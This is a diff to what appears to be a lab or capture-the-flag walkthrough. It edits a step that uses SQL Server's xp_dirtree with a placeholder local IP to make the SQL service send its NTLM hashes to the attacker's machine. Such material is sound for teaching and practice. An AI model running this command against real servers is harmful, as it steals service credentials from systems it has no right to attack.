@@ -91,7 +91,8 @@ Information can be found using "ip addr show"
 
 Term 1:
 Next we will send the hashes from the SQL Service with the following command:
-xp_dirtree '\\[YOUR LOCAL IP]\share\file'
+
+xp_dirtree '\\\\[YOUR LOCAL IP]\share\file'
 
 </details>
 
